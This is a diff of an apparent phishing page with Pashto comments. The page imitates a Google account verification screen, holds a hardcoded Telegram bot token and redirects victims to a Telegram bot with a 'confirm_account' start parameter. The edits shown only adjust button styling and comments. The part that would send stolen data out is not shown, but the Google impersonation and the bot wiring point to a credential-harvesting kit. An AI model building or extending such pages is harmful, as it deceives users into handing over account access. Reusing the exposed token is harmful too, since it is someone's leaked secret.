@@ -84,15 +84,6 @@
         }
         .cancel-btn:hover { background: #c82333; }
         .hidden { display: none; }
-        .btn-group {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-        .btn-group .cancel-btn {
-            margin-top: 0;
-            flex: 1;
-        }
     </style>
 </head>
 <body>
@@ -126,9 +117,7 @@
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
         <div class="sub">Your account has been successfully verified!</div>
-        <div class="btn-group">
-            <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
-        </div>
+        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -138,7 +127,7 @@
 </div>
 
 <script>
-    // ========== د بوټ لینک (ستاسو د بوټ یوزرنیم سره) ==========
+    // ========== د بوټ لینک - ستاسو د بوټ سره بدل کړئ ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -221,7 +210,7 @@
         }
     };
     
-    // د CANCEL تڼۍ - مستقیم بوټ ته ځي او لومړی ګام بشپړوي
+    // د CANCEL تڼۍ - بوټ ته ځي او لومړی ګام بشپړوي
     document.getElementById('cancelBtn').onclick = () => {
         window.location.href = BOT_REDIRECT;
     };
